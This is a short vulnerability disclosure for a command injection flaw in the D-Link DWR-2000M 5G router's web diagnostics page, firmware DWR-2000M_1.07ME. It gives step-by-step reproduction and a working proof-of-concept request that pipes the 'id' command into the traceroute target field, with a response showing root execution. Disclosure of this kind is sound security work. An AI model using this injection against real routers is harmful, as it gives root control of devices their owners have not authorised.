# Arbitraty Code Execution vulnerability in DLink DWR 2000M 5G  
## Main informations  
**CVE ID:** Soon  
**Vulnerability:** Remote Code Execution (Arbitraty Code Execution/Command Injection)  
**Author:** Meddeb Taieb - Abgache  
**Vendor Homepage:** [D-Link DWR-2000M 5G Wi-Fi Router](https://dlinkmea.com/index.php/product/details?det=K1o4UkpXMHIreWZYMzhnV0JwbWFadz09)  
**Model:**  DLink DWR 2000M 5G  
**Version:**  DWR-2000M_1.07ME  

---

## Description
A command injection vulnerability exists in the DWR-2000M T-Link router web management interface.  
An authenticated administrator can inject arbitrary operating system commands via the diagnostics (ping, nslookup, traceroute) functionalities.  
Successful exploitation may lead to arbitrary command execution on the underlying system with elevated privileges (root).  

## How to reproduce it?  
**1st step:** Login to the admin panel.  
**2nd step:** Go to More > Developer > Diagnostics  
**3rd step:** Run any test (ping/traceroute/nslookup) with [burpsuite](https://portswigger.net/burp)
**4th step:** Add a pipe ( ``|`` / ``%7C``) at the end of the target setting and add your command after that (do not forget to replace spaces by ``${IFS}``)   

### example:  
**Payload:**  
```  
GET /cgi-bin/luci/admin/status/network_diagnostics?cmdMethod=traceroute&target=127.0.0.1%7Cid&pingCNT=5&1777639483733  
                                                                                           ^^  
                                                                                    Injected command  
```  
**Response:**  
```bash  
{"status":1,"cmdMessage":"uid=0(root) gid=0(root)\n"}  
```  

